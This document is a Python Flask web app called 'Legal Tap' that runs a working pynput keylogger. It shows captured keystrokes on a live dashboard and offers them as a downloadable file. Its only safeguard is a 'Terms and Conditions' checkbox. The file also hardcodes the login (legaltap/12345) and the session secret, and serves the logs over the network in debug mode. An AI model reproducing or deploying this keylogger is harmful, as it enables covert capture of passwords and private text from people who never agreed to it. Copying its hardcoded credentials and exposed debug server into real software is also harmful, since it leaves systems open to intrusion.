from flask import Flask, render_template, request, jsonify, send_file, redirect, url_for, session
import threading
import pynput.keyboard as keyboard
import os

app = Flask(__name__)
app.secret_key = 'supersecretkey'  # For session management

# Global Variables
log = ""  # Store keystrokes
keylogger_active = False  # Keylogger state
log_file_path = "keylogs.txt"

# Lock for thread safety
log_lock = threading.Lock()

# Keylogger Logic
def start_keylogger():
    global log, keylogger_active

    def on_press(key):
        global log, keylogger_active
        if not keylogger_active:
            return False
        try:
            log_lock.acquire()
            log += key.char if hasattr(key, 'char') and key.char else str(key) + " "
        finally:
            log_lock.release()

    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

@app.route('/')
def login():
    return '''
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Legal Tap Login</title>
        <style>
            body {
                font-family: 'Arial', sans-serif;
                background: linear-gradient(135deg, #1f1f2e, #0d47a1);
                color: #ffffff;
                text-align: center;
                margin: 0;
                padding: 0;
            }
            .login-box {
                margin-top: 100px;
                padding: 30px;
                background: rgba(0, 0, 0, 0.8);
                border-radius: 15px;
                width: 350px;
                box-shadow: 0px 0px 20px 5px #0d47a1;
                display: inline-block;
            }
            input[type=text], input[type=password] {
                width: 90%;
                padding: 10px;
                margin: 10px 0;
                background: #1c1c2b;
                border: 1px solid #3e4e7c;
                color: #ffffff;
                border-radius: 5px;
            }
            button {
                padding: 10px 20px;
                background: #1565c0;
                color: #fff;
                border: none;
                border-radius: 5px;
                cursor: pointer;
                transition: background 0.3s;
            }
            button:hover {
                background: #1e88e5;
            }
            h1 {
                color: #42a5f5;
            }
        </style>
    </head>
    <body>
        <div class="login-box">
            <h1>Legal Tap</h1>
            <form method="POST" action="/login">
                <input type="text" name="username" placeholder="Username" required><br>
                <input type="password" name="password" placeholder="Password" required><br>
                <button type="submit">Login</button>
            </form>
        </div>
    </body>
    </html>
    '''

@app.route('/login', methods=['POST'])
def do_login():
    username = request.form['username']
    password = request.form['password']

    if username == 'legaltap' and password == '12345':
        session['logged_in'] = True
        return redirect(url_for('index'))
    else:
        return "<h1 style='color: red;'>Invalid username or password</h1>"

@app.route('/logout')
def logout():
    session.pop('logged_in', None)
    return redirect(url_for('login'))

@app.route('/dashboard')
def index():
    if not session.get('logged_in'):
        return redirect(url_for('login'))
    return '''
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Legal Tap Dashboard</title>
        <style>
            body {
                font-family: 'Arial', sans-serif;
                background: linear-gradient(135deg, #1f1f2e, #0d47a1);
                color: #ffffff;
                margin: 0;
                padding: 0;
            }
            .container {
                padding: 20px;
                text-align: center;
            }
            button {
                padding: 10px 20px;
                background: #1565c0;
                color: #fff;
                border: none;
                border-radius: 5px;
                cursor: pointer;
                margin: 10px;
                transition: background 0.3s;
            }
            button:hover {
                background: #1e88e5;
            }
            textarea {
                width: 90%;
                height: 150px;
                background: #1c1c2b;
                border: 1px solid #3e4e7c;
                color: #ffffff;
                border-radius: 5px;
                margin: 10px 0;
                padding: 10px;
            }
            h1 {
                color: #42a5f5;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>Legal Tap Dashboard</h1>
            <button onclick="showTerms()">Start Keylogger</button>
            <button onclick="stopKeylogger()">Stop Keylogger</button>
            <button onclick="clearLogs()">Clear Logs</button>
            <button onclick="downloadLogs()">Download Logs</button>
            <textarea id="logBox" readonly placeholder="Keystrokes will appear here..."></textarea>
        </div>
        <div id="termsModal" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.8); color:#fff; text-align:center;">
            <div style="margin:10% auto; width:80%; background:#1c1c2b; border-radius:15px; padding:20px;">
                <h2>Terms and Conditions</h2>
                <p>This software is intended for monitoring purposes with explicit consent. Misuse of this software may result in legal consequences. The owner of this software is not responsible for any illegal use. By proceeding, you accept sole responsibility for your actions.</p>
                <input type="checkbox" id="acceptTerms"> I Accept<br><br>
                <button onclick="acceptTerms()">Proceed</button>
                <button onclick="closeTerms()">Cancel</button>
            </div>
        </div>
        <script>
            function showTerms() {
                document.getElementById('termsModal').style.display = 'block';
            }

            function closeTerms() {
                document.getElementById('termsModal').style.display = 'none';
            }

            function acceptTerms() {
                if (document.getElementById('acceptTerms').checked) {
                    closeTerms();
                    startKeylogger();
                } else {
                    alert('You must accept the terms and conditions to proceed.');
                }
            }

            async function startKeylogger() {
                const response = await fetch('/start', { method: 'POST' });
                alert((await response.json()).message);
            }
            async function stopKeylogger() {
                const response = await fetch('/stop', { method: 'POST' });
                alert((await response.json()).message);
            }
            async function clearLogs() {
                const response = await fetch('/clear', { method: 'POST' });
                document.getElementById('logBox').value = '';
                alert((await response.json()).message);
            }
            async function downloadLogs() {
                window.location.href = '/download';
            }
            async function fetchLogs() {
                const response = await fetch('/get_logs');
                const data = await response.json();
                document.getElementById('logBox').value = data.logs;
            }
            setInterval(fetchLogs, 1000);
        </script>
    </body>
    </html>
    '''

@app.route('/start', methods=['POST'])
def start_logging():
    global keylogger_active

    if not keylogger_active:
        keylogger_active = True
        threading.Thread(target=start_keylogger, daemon=True).start()
        return jsonify({"status": "success", "message": "Keylogger started."})

    return jsonify({"status": "error", "message": "Keylogger already running."})

@app.route('/stop', methods=['POST'])
def stop_logging():
    global keylogger_active

    keylogger_active = False
    return jsonify({"status": "success", "message": "Keylogger stopped."})

@app.route('/get_logs', methods=['GET'])
def get_logs():
    global log

    log_lock.acquire()
    try:
        return jsonify({"logs": log})
    finally:
        log_lock.release()

@app.route('/download', methods=['GET'])
def download_logs():
    global log

    with open(log_file_path, 'w') as file:
        file.write(log)

    return send_file(log_file_path, as_attachment=True)

@app.route('/clear', methods=['POST'])
def clear_logs():
    global log

    log_lock.acquire()
    try:
        log = ""
    finally:
        log_lock.release()

    return jsonify({"status": "success", "message": "Logs cleared."})

if __name__ == '__main__':
    app.run(host="0.0.0.0", port=5000, debug=True)
